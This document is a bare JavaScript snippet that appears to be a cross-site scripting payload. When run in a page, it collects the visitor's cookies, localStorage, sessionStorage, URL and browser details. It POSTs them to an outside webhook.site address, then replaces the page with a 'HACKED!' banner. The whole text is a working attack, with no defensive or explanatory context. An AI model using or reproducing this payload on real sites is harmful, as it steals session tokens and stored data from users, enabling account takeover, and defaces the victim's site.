(function(){
  var victim = {
    url: window.location.href,
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    userAgent: navigator.userAgent,
    screen: screen.width+'x'+screen.height,
    title: document.title
  };
  fetch('https://webhook.site/f3d30d6d-8d88-4fd8-8590-b70007607245', {
    method: 'POST',
    body: JSON.stringify(victim),
    headers: {'Content-Type': 'application/json'}
  });
  document.body.innerHTML = '<h1 style="color:red">HACKED!</h1>';
})();

